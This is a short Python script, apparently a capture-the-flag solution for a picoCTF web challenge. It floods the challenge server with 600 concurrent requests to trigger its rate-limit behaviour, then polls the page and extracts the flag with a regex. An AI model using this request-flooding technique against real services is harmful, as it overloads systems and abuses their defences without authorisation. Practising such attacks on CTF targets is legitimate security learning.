import requests
from concurrent.futures import ThreadPoolExecutor
import re
import time
URL = "http://mysterious-sea.picoctf.net:61875/"

def send_request():
    try:
        r = requests.get(URL, timeout=3)
        return r
    except:
        return None# Flood the server
print("Flooding the server to trigger rate limit...")

with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(600):
        executor.submit(send_request)# Poll for the flag
print("Checking for flag...")

for _ in range(30):
    r = requests.get(URL)
    if "picoCTF" in r.text:
        flag = re.search(r"picoCTF{.*}", r.text)
        print("Flag:", flag.group(0))
        break
    time.sleep(1)

